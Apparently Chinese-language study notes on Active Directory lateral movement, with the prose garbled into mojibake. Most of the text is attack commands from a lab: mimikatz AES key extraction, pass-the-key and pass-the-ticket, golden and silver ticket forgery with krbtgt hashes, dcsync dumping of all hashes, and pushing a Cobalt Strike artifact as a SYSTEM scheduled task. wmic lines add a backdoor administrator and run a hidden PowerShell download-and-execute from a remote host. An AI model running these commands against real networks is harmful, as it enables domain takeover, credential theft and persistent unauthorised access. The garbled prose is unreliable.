<p>dadmin æ˜¯ä¸€ä¸ªåŸŸç®¡è´¦å·,è¿™é‡Œä½¿ç”¨æ™®é€šåŸŸç”¨æˆ·å¯èƒ½ä¼šå¤±è´¥ã€‚</p>
<h4 id="PTK-ä¸Šçº¿-CS"><a href="#PTK-ä¸Šçº¿-CS" class="headerlink" title="PTK ä¸Šçº¿ CS"></a>PTK ä¸Šçº¿ CS</h4><p>PTK æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§è®¤è¯ï¼Œæœ¬èº«ä¸å…·æœ‰æ”»å‡»æ€§ï¼Œå¦‚æœçŸ¥é“ä¸€äº›ç‰¹æ®Šè´¦å·çš„ KEY å°±å¯ä»¥åˆ©ç”¨ PTK ä¼ é€’æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥ getTGT å·¥å…·ç”Ÿæˆå¯¹åº”è´¦å·çš„ TGT ç¥¨æ®(åç¼€æ˜¯ccache)ï¼Œç„¶åå°†ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ä¸­ï¼Œå–å¾—å¯¹ç›®æ ‡æœºå™¨çš„è®¿é—®æƒã€‚åç»­å¯ä»¥ä½¿ç”¨è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡ç­‰ä¸Šçº¿ CSã€‚</p>
<p>è¿™ä¹‹å‰çš„ç¯å¢ƒå‡†å¤‡ï¼Œç”±äºæœªçŸ¥åŸå› mimikatzçš„å‘½ä»¤æ— æ³•è¯»å–åˆ°Adminitratorçš„AESKEYï¼Œæ‰€æœ‰è¿™é‡Œé€‰æ‹©åœ¨åŸŸæ§æ–°å»ºäº†ä¸€ä¸ªtestuser1ç”¨æˆ·ä½œä¸ºç®¡ç†å‘˜æƒé™ç”¨æˆ·</p>
<ol>
<li><p>æœ€å¼€å§‹çš„æ—¶å€™ç¡®è®¤ç¥¨æ®<br><img src="https://i.imgur.com/cGHlcGa.png"></p>
</li>
<li><p>ä½¿ç”¨ <code>mimikatz â€œprivilege::debugâ€ â€œsekurlsa::ekeysâ€</code> è¯»å– AES keyã€‚<br><img src="https://i.imgur.com/qPbxbvK.png" alt="1000"><br><img src="https://i.imgur.com/jq4MfPd.png" alt="1000"></p>
</li>
<li><p>ç”Ÿæˆ TGT ç¥¨æ®:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe kea.com/testuser1 -aesKey 3f7d53bb696c889aabf38ead93a4c002efc3e088bbb94e6b9207f0c0cc800519</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/0qwDQVc.png" alt="800"></p>
</li>
<li><p>å¯¼å…¥å†…å­˜:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc testuser1.ccache&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/cMPZJKm.png" alt="800"></p>
</li>
<li><p>æŸ¥çœ‹æ˜¯å¦å¯¼å…¥æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::list</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/XsAxPu2.png" alt="800"></p>
</li>
</ol>
<p>æŸ¥çœ‹ç¥¨æ®åˆ—è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/z0MrGwR.png" alt="800"></p>
<p>è€Œä¸”å¯ä»¥æ­£å¸¸è®¿é—®å…¶ä»–ç”¨æˆ·<br><img src="https://i.imgur.com/qleMPyM.png" alt="800"></p>
<ol start="6">
<li>ä¼ é€’æœ¨é©¬,åˆ›å»ºå¹¶æ‰§è¡Œè®¡åˆ’ä»»åŠ¡<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy artifact2.exe \\192.168.255.10\c$\ptk.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.255.10 /tr c:\ptk.exe /tn ptktest /sc onstart /ru system /f</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.255.10 /tn ptktest /i</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/uWBi7n3.png"><br>æˆåŠŸä¸Šçº¿<br><img src="https://i.imgur.com/yDXynMu.png"></li>
</ol>
<blockquote>
<p>[!NOTE] åˆ é™¤è®¡åˆ’ä»»åŠ¡<br><code>shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn ptktest /f</code></p>
</blockquote>
<ol start="7">
<li>æ¸…é™¤ç¥¨æ®:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/yIFnec2.png"></li>
</ol>
<h3 id="PTT-PTC"><a href="#PTT-PTC" class="headerlink" title="PTT&amp;PTC"></a>PTT&amp;PTC</h3><p>PTK(Pass The Ticket)ä¸­æ–‡å«ç¥¨æ®ä¼ é€’æ”»å‡»ï¼ŒPTT æ”»å‡»åªèƒ½ç”¨äº kerberos è®¤è¯ä¸­ï¼ŒNTLM è®¤è¯ä¸­æ²¡æœ‰ã€‚PTT æ˜¯é€šè¿‡ç¥¨æ®è¿›è¡Œè®¤è¯çš„ï¼Œå›é¡¾ kerberos è®¤è¯çš„æµç¨‹ä¾¿å¯ç†è§£ï¼Œä¸å†èµ˜è¿°ã€‚è¿›è¡Œç¥¨æ®ä¼ é€’ï¼Œä¸éœ€è¦ææƒã€‚</p>
<p>è·å– TGT å’Œ ST çš„æ–¹å¼:<br>â€¢ åŸŸè´¦å·æ˜æ–‡å¯†ç <br>â€¢ åŸŸè´¦å·çš„ NTLM-HASH<br>â€¢ åŸŸè´¦å·çš„ Aes key<br>â€¢ ç›´æ¥ä¼ªé€ <br>â€¢ ç³»ç»Ÿæ¼æ´<br>â€¢ ç³»ç»Ÿé—ç•™ç¥¨æ®</p>
<p>ä½¿ç”¨æ˜æ–‡ç”Ÿæˆç¥¨æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe gouzi.com/dadmin:123456</span><br><span class="line"></span><br><span class="line">getTGT.exe gouzi.com/dadmin -hashes LM-HASH:NTLM-HASH</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ¡ä»¶<br>1ã€åŸŸå†…ç¯å¢ƒ<br>2ã€èƒ½å¤Ÿè·å–ç›¸åº”çš„ç¥¨æ®(ä¸»è¦é’ˆå¯¹åŸŸç®¡ç†å‘˜)</p>
<p>Ccahe å’Œ Kirbi ç¥¨æ®ï¼šä¸åŒçš„å·¥å…·è·å–çš„ç¥¨æ®åç¼€ä¸ä¸€æ ·ï¼Œå¸¸è§çš„æœ‰ Ccache å’Œ Kirbiã€‚</p>
<ul>
<li>getTGT å·¥å…·ç”Ÿæˆçš„æ˜¯ Ccache ç¥¨æ®</li>
<li>kekeo å·¥å…·ç”Ÿæˆçš„æ˜¯ Kirbi ç¥¨æ®ã€‚<br>ä½†æ˜¯æœ¬è´¨ä¸Šéƒ½å¯ä»¥ä½œä¸º TGT ç¥¨æ®ï¼Œä¸”å¯ä»¥äº’ç›¸è½¬æ¢</li>
</ul>
<h3 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h3><p>åŸç†å¿˜äº†å°±å›é¡¾ä¸€ä¸‹ kerberosï¼Œæˆ‘ä»¬ä¹‹å‰å­¦çš„ PTKã€PTT æ”»å‡»éƒ½æ˜¯é€šè¿‡æ­£å¸¸çš„è®¤è¯æµç¨‹ä½¿å¾— KDC è¿”å›ä¸€å¼ åˆæ³•ç¥¨æ®ï¼Œä½†æ˜¯å‰æå°±æ˜¯å¿…é¡»è¦æ‹¥æœ‰é«˜æƒé™ç”¨æˆ·çš„ hashå€¼æˆ–è€… aes keyã€‚</p>
<p>å‡è®¾æˆ‘ä»¬å·²ç»æ§åˆ¶äº† DCï¼Œèƒ½å¤Ÿé€šè¿‡å„ç§æ‰‹æ®µè·å– krbtgt ç”¨æˆ·çš„ hash å€¼ï¼Œå°±èƒ½ä¸ä¾é  KDC å‡­ç©ºç”Ÿæˆä¸€å¼ é»„é‡‘ç¥¨æ®ï¼Œè¿™ç§åšæ³•æ¯”è¾ƒéšè”½ä¸”ä¸å¥½æº¯æºã€‚æ‰€ä»¥ä¸€èˆ¬ç”¨æ¥ä½œä¸ºå†…ç½‘æƒé™ç»´æŒï¼ˆé»„é‡‘ç¥¨æ®å¯ä»¥åœ¨å·¥ä½œç»„ç¯å¢ƒä¸‹ä½¿ç”¨ï¼‰çš„ä¸€ç§å¸¸ç”¨æ‰‹æ®µã€‚</p>
<p>åˆ©ç”¨æ¡ä»¶<br>â€¢ krbtgt ç”¨æˆ·çš„ hash å€¼<br>â€¢ åŸŸå<br>â€¢ åŸŸçš„ SID å€¼<br>â€¢ ä¼ªé€ ç”¨æˆ·</p>
<p>åŸŸçš„ sid å€¼ä½¿ç”¨ä»»æ„åŸŸç”¨æˆ·æ‰§è¡Œ whoami &#x2F;all å³å¯å¾—å‡º:<br><img src="https://i.imgur.com/mzvyOwG.png"></p>
<ul>
<li>å»æ­¤å¤„å¾—SIDç”¨äºåç»­å®éªŒï¼šS-1-5-21-880678290-82948828-1398698765-500</li>
</ul>
<p>1ã€ä½¿ç”¨ mimikatzåˆ¶ä½œé»„é‡‘ç¥¨æ®å¹¶ä¸”æ³¨å…¥å†…å­˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrartor /domain:kea.com /sid:S-1-5-21-880678290-82948828-1398698765-500 /krbtgt:a2b1adb8df28b28ea2472b73b960c967 /ptt</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/wGOZOli.png"></p>
<ul>
<li>æ­¤å¤„çš„sidå–çš„åŸŸç”¨æˆ·æœºWin-1</li>
<li>æ¬¡æ•°krbtgtè¯·åœ¨åŸŸæ§æœºå™¨ä¸Šè¿è¡Œhashdumpè‡ªè¡Œè·å–<br>jumpä¸Šçº¿<br><img src="https://i.imgur.com/OwgaSmk.png"><br><img src="https://i.imgur.com/SjVV8TI.png"></li>
</ul>
<p>2ã€ä½¿ç”¨ impacket-ticketer:ç”Ÿæˆ.ccache ç¥¨æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ticketer.exe -domain-sid &quot;sid&quot; -nthash &quot;NTLMHASH&quot; -domain &quot;domain&quot; &quot;username&quot;</span><br><span class="line"></span><br><span class="line">ticketer.exe -domain-sid S-1-5-21-880678290-82948828-1398698765-500 -nthash a2b1adb8df28b28ea2472b73b960c967 -domain kea.com administrator</span><br><span class="line"></span><br><span class="line">mimikatz.exe kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/M3M1B57.png"></p>
<p>3ã€MSF kiwi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d gouzi.com -k 0e5c40110da014eaf2fe8d862194af7f -s S-1-5-21-4192929989-692860420-895873630 -u administrator -t /tmp/administrator.ticket</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]<br>ä¸Šçº¿è¿‡ç¨‹ä¸å†æ¼”ç¤ºï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯å¦‚æœéœ€è¦åˆ©ç”¨å·¥ä½œç»„æœºå™¨ä½¿ç”¨é»„é‡‘ç¥¨æ®è®¿é—® dc,å¦‚æœå½“å‰æœºå™¨ä¸èƒ½é€šè¿‡åŸŸåç›´æ¥è®¿é—®æœºå™¨ï¼Œå°±éœ€è¦ä¿®æ”¹ hostæ–‡ä»¶æˆ–è€… dns é…ç½®ã€‚æ¯”å¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.197.10 dc.gouzi.com &gt;&gt; C:</span><br><span class="line"></span><br><span class="line">netsh interface ipv4 add dns æœ¬åœ°è¿æ¥ 192.168.197.10</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„æœ¬åœ°è¿æ¥æ˜¯ç½‘å¡åå­—ï¼Œå¯ä»¥ä½¿ç”¨ systeminfo çœ‹è§ï¼Œä¸­æ–‡æœºå™¨å¸¸ä½¿ç”¨â€æœ¬åœ°è¿æ¥â€</p>
</blockquote>
<p>åŸŸå¤–æœºå™¨å°è¯•ä¸Šçº¿: </p>
<ol>
<li>ä½¿ç”¨ticketer.exeç¦»çº¿ç”Ÿæˆ.ccacheç¥¨æ®<br><img src="https://i.imgur.com/zAyljql.png"></li>
</ol>
<ul>
<li>sidå–å…ˆå‰åŸŸç”¨æˆ·çš„</li>
<li>hashå…ˆå‰krbtgt</li>
</ul>
<ol start="2">
<li><p>å°†ç”Ÿæˆçš„ç¥¨æ®å¡è¿›åŸŸå¤–çš„æœºå™¨,ä½¿ç”¨mimikatz.exeçš„å‘½ä»¤æ¥å°†ç¥¨ä»·å‡­è¯æ³¨å…¥å†…å­˜<br><img src="https://i.imgur.com/IVOUGmC.png"><br>éªŒè¯æ˜¯å¦æˆåŠŸå¯¼å…¥ç¥¨æ®<br><img src="https://i.imgur.com/4F98t7g.png"></p>
</li>
<li><p>å°†è¯¥æœºå™¨çš„dnsæ”¹ä¸ºç›®æ ‡æœºå™¨çš„åŸŸå192.168.255.10<br><img src="https://i.imgur.com/hucCXGT.png"></p>
</li>
<li><p>ä½¿ç”¨jumpå‘½ä»¤ä¸Šçº¿<br><img src="https://i.imgur.com/nb8mHnk.png"><br><img src="https://i.imgur.com/stu6e54.png"></p>
</li>
</ol>
<h3 id="ç™½é“¶ç¥¨æ®"><a href="#ç™½é“¶ç¥¨æ®" class="headerlink" title="ç™½é“¶ç¥¨æ®"></a>ç™½é“¶ç¥¨æ®</h3><p>ç™½é“¶ç¥¨æ®å°±æ˜¯ä¼ªé€  ST ç¥¨æ®ï¼Œåœ¨æ•´ä¸ª kerberos åè®®è®¤è¯è¿‡ç¨‹ä¸­ï¼Œè·³è¿‡äº† TGS çš„è®¤è¯ã€‚</p>
<p>ä¸€èˆ¬ä¼ªé€  ST ç¥¨æ®ä¸­çš„æœåŠ¡éƒ½æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„æœåŠ¡ï¼Œæ¯”å¦‚ CIFSã€HOST æœåŠ¡ï¼Œæ–¹ä¾¿åç»­æ¨ªå‘ç§»åŠ¨ã€‚</p>
<p>å‰ææ¡ä»¶</p>
<ul>
<li>åŸŸå&amp;åŸŸ SID</li>
<li>æœåŠ¡ç«¯å…¨åŸŸå</li>
<li>æœåŠ¡ç«¯å¯åˆ©ç”¨çš„ SPN</li>
<li>æœåŠ¡ç«¯ SPN æ³¨å†Œç”¨æˆ·çš„ hash å€¼(ä¸€èˆ¬é€‰æ‹©æœºå™¨ç”¨æˆ· hash)</li>
<li>éœ€è¦ä¼ªé€ çš„ç”¨æˆ·å</li>
</ul>
<p>æœºå™¨ç”¨æˆ· hash å€¼çš„è·å–æ–¹å¼ï¼š</p>
<ul>
<li>mimikatz-åŸŸç®¡ç†å‘˜ dcsync</li>
<li>secretsdump-åŸŸç®¡ç†å‘˜è¯»å–å¯†ç </li>
</ul>
<p>ç¥¨æ®åˆ¶ä½œ</p>
<p>ç™½é“¶ç¥¨æ®ä¹Ÿæ˜¯ä¸€ç§æƒé™ç»´æŒçš„æ–¹å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ªé€ çš„æœåŠ¡ç›®çš„ä¸€èˆ¬æ˜¯ä¸ºäº†æ–¹ä¾¿æ¨ªå‘ç§»åŠ¨ã€‚éœ€è¦æ ¹æ®ä¸åŒçš„æ§åˆ¶æ‰‹æ®µæ¥é€‰æ‹©ä¸åŒçš„æœåŠ¡ã€‚</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>éœ€è¦çš„æœåŠ¡</th>
</tr>
</thead>
<tbody><tr>
<td>copy|dir|psexec cifs</td>
<td>cifs</td>
</tr>
<tr>
<td>è®¡åˆ’ä»»åŠ¡&#x2F;æœåŠ¡</td>
<td>host</td>
</tr>
<tr>
<td>dcsync</td>
<td>cifsã€ldap</td>
</tr>
<tr>
<td>winrs</td>
<td>http</td>
</tr>
<tr>
<td>wmi</td>
<td>RestrictedKrbHostã€hostã€RPCSS</td>
</tr>
</tbody></table>
<h4 id="å®éªŒ-ä½¿ç”¨-mimikatz-åˆ¶ä½œç™½é“¶ç¥¨æ®ï¼š"><a href="#å®éªŒ-ä½¿ç”¨-mimikatz-åˆ¶ä½œç™½é“¶ç¥¨æ®ï¼š" class="headerlink" title="å®éªŒ-ä½¿ç”¨ mimikatz åˆ¶ä½œç™½é“¶ç¥¨æ®ï¼š"></a>å®éªŒ-ä½¿ç”¨ mimikatz åˆ¶ä½œç™½é“¶ç¥¨æ®ï¼š</h4><p>ä¸ºäº†é¿å…ç‰¹æƒç”¨æˆ·çš„å½±å“ï¼Œæ‰€ä»¥è¿™é‡Œé€‰ç”¨ä¸€ä¸ªåŸŸæˆå‘˜æœºå™¨æ¥å®éªŒ:<br><img src="https://i.imgur.com/mww7HKX.png"></p>
<ol>
<li>ç”ŸæˆcifsæœåŠ¡ç™½é“¶ç¥¨æ®<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:kea.com /sid:S-1-5-21-697776903-4083723091-3295495450 /target:WIN-DBNULB576SJ.kea.com /service:cifs /rc4:79b2d38d45d8909a4a27108d9f71935b /user:dadmin /ptt</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/1Q7k4Ob.png"></li>
</ol>
<ul>
<li>sidé‡‡ç”¨æœºå™¨ç”¨æˆ·åŸŸæ§ç®¡ç†å‘˜ç”¨æˆ·çš„sid</li>
<li>hashé‡‡ç”¨åŸŸæ§ç”¨æˆ·ä¸­æœºå™¨ç”¨æˆ·WIN-DBNULB576SJçš„hash</li>
<li>æœåŠ¡é€‰å®šä¸ºcifsæ–‡ä»¶æœåŠ¡<br>ç¡®è®¤ç¥¨æ®æˆåŠŸç”Ÿæˆ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/S5vE3dr.png"></li>
</ul>
<ol start="2">
<li>ç¡®è®¤æœåŠ¡æˆåŠŸç”Ÿæ•ˆ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\WIN-DBNULB576SJ.kea.com\c$</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/xbHE2An.png"></li>
</ol>
<h4 id="å®éªŒ-ä¼ªé€ -ldap-æœåŠ¡ä¸Šçº¿-dcï¼š"><a href="#å®éªŒ-ä¼ªé€ -ldap-æœåŠ¡ä¸Šçº¿-dcï¼š" class="headerlink" title="å®éªŒ-ä¼ªé€  ldap æœåŠ¡ä¸Šçº¿ dcï¼š"></a>å®éªŒ-ä¼ªé€  ldap æœåŠ¡ä¸Šçº¿ dcï¼š</h4><blockquote>
<p>å¯¹å½“å‰ shell ç¯å¢ƒæ²¡æœ‰è¦æ±‚<br>å¦‚æœå½“å‰æœºå™¨ä¸åœ¨åŸŸï¼Œéœ€è¦ä¿®æ”¹ DNS</p>
</blockquote>
<p>å…ˆç¡®è®¤ç¯å¢ƒèƒ½å¦æ­£å¸¸ä½¿ç”¨dcsyncæœåŠ¡<br><img src="https://i.imgur.com/r64yjaJ.png"></p>
<p>åˆ¶ä½œ ldap ç¥¨æ®å’Œ cifs ç¥¨æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:gouzi.com /sidS-1-5-21-697776903-4083723091-3295495450 /target:dc.gouzi.com /service:ldap /rc4:da1ac177f6e26a201455def0ae82fc2b /user:dadmin /ptt</span><br><span class="line"></span><br><span class="line">mimikatz kerberos::golden /domain:gouzi.com /sid:S-1-5-21-697776903-4083723091-3295495450 /target:dc.gouzi.com /service:cifs /rc4:da1ac177f6e26a201455def0ae82fc2b /user:dadmin /ptt</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ·»åŠ ldapç¥¨æ®<br><img src="https://i.imgur.com/1RexTCM.png"></p>
<p>dcsync æŸ¥è¯¢ hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/I5n52So.png"></p>
<p>åˆ©ç”¨ krbtgt ç”¨æˆ·åˆ¶ä½œé‡‘ç¥¨<br>CS è‡ªå¸¦é»„é‡‘ç¥¨æ®åˆ¶ä½œåŠŸèƒ½ï¼Œå¡«å…¥åŸŸçš„ sid å’Œ krbtgt ç”¨æˆ·çš„ hash å€¼ï¼Œé€‰æ‹©ä¸€ä¸ªç”¨æˆ·åˆ¶ä½œå³å¯ï¼ˆä¸€èˆ¬æ˜¯åŸŸç®¡æˆ–è€… administratorï¼‰</p>
<p>psexec æ¨ªå‘ç§»åŠ¨:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec dc.gouzi.com</span><br></pre></td></tr></table></figure>



<p>WMIï¼ˆWindows Management Instrumentationï¼ŒWindows ç®¡ç†è§„èŒƒï¼‰æ˜¯ Windowsæ“ä½œç³»ç»Ÿä¸­å†…ç½®çš„ç³»ç»Ÿå·¥å…·æ¡†æ¶ï¼Œå®ƒæ˜¯ Windows 2000&#x2F;XP åŠæ›´é«˜ç‰ˆæœ¬ç®¡ç†ç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œå±äºç®¡ç†æ•°æ®å’Œæ“ä½œçš„åŸºç¡€æ¨¡å—ã€‚</p>
<p>WMI æ—¨åœ¨å®ç°æœ¬åœ°æˆ–è¿œç¨‹çš„ç³»ç»Ÿã€åº”ç”¨ç¨‹åºç­‰èµ„æºçš„ç®¡ç†ã€é…ç½®ã€ç›‘è§†ã€‚å®ƒä½¿ç”¨WQL æŸ¥è¯¢è¯­è¨€è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œå¹¶å¯é€šè¿‡ PowerShellã€WMIC å’Œ WBEMTEST ç­‰å·¥å…·è¿›è¡Œäº¤äº’ã€‚WMI æ”¯æŒ DCOM å’Œ WinRM åè®®ï¼Œå…è®¸ç½‘ç»œç®¡ç†å‘˜ç›‘è§†è®¾å¤‡ã€è®¿é—®é‡è¦ä¿¡æ¯ï¼Œå¹¶åœ¨æ•…éšœæ’æŸ¥ã€å®‰å…¨å®¡è®¡ç­‰æ–¹é¢å‘æŒ¥é‡è¦ä½œç”¨ã€‚åœ¨ä½¿ç”¨ wmiexec è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ—¶ï¼Œä¸ä¼šåœ¨ç³»ç»Ÿä¸­ç•™ä¸‹æ“ä½œæ—¥å¿—ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šè§„é¿å®‰å…¨è®¾å¤‡(wmic èµ°çš„æ˜¯ rpc åè®®)ã€‚</p>
<blockquote>
<p>WMICï¼ˆWindows Management Instrumentation Command-lineï¼‰æ˜¯ WMIçš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºä¸ WMI è¿›è¡Œäº¤äº’ã€‚æ˜¯ä¸€ä¸ªæ¯” Windows CMD æ›´åŠ å¼ºå¤§çš„å‘½ä»¤é›†ã€‚</p>
</blockquote>
<p><strong>wmic å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹:</strong></p>
<p>å½“å‰ç™»å½•ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åˆ—è¡¨:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic list brief</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨é¡¹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup list brief</span><br></pre></td></tr></table></figure>

<p>å®‰è£…è½¯ä»¶:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<p>è¡¥ä¸æƒ…å†µ:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief</span><br></pre></td></tr></table></figure>

<p>æ˜¯å¦è™šæ‹Ÿæœº:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic bios list full |findstr /i &quot;vmware&quot;</span><br></pre></td></tr></table></figure>

<p>è·å–æŒ‡å®šç¨‹åºçš„è·¯å¾„å’Œå¯åŠ¨å‘½ä»¤è¡Œ:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;cmd.exe&quot; get ExecutablePath,CommandLine</span><br></pre></td></tr></table></figure>

<p>è¿æ¥è¿œç¨‹ç”µè„‘(é«˜æƒé™ç”¨æˆ·):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:&quot;ip&quot; /user:user /password:pass</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºè¿›ç¨‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create</span><br><span class="line">wmic process call create &quot;C:\Windows\System32\notepad.exe&quot;</span><br></pre></td></tr></table></figure>

<p>å…³é—­è¿›ç¨‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;è¿›ç¨‹åç§°&quot; call terminate</span><br><span class="line">wmic process where name=&quot;notepad.exe&quot; call terminate</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ WMIC å‘½ä»¤é›†çš„å¼ºå¤§ç®¡ç†åŠŸèƒ½å’Œæ”¯æŒè¿œç¨‹æ‰§è¡Œå‘½ä»¤çš„ç‰¹ç‚¹ï¼Œåšä¸€äº›æ“ä½œï¼Œæ¯”å¦‚ï¼š</p>
<p>è¿œç¨‹æ·»åŠ ç®¡ç†:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.197.30 /user:administrator /password:aqa@123 process call create &quot;cmd.exe /c net user jack hack@123 /add &amp;&amp; net localgroup administrators jack /add&quot;</span><br></pre></td></tr></table></figure>

<p>è¿œç¨‹æ‰§è¡Œ powershell ä¸Šçº¿(ç½‘ç»œç•…é€š):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.197.30 /user:administrator /password:aqa@123 process call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://192.168.31.212/payload_x64.ps1&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ¡ä»¶</p>
<ul>
<li>shell ç¯å¢ƒ:æ™®é€šç®¡ç†å‘˜æˆ–è€…åŸŸç®¡ç†å‘˜ã€‚</li>
<li>ç›®æ ‡ç¯å¢ƒ:è·å–æœ¬åœ° administrator å¯†ç ï¼Œæˆ–è€…å·²ç»å–å¾—åŸŸç®¡ç†å‘˜ä»¥ä¸Šæƒé™è´¦å·çš„ç”¨æˆ·å¯†ç ï¼Œæˆ–è€…å·²ç»å’Œç›®æ ‡ä¸»æœºå»ºç«‹ä¿¡ä»»å…³ç³»ã€‚</li>
<li>ç«¯å£:445 å’Œ 135ã€‚</li>
</ul>
<p>å®éªŒå†…å®¹-ä½¿ç”¨powershellå‘½ä»¤CS ä¸Šçº¿</p>
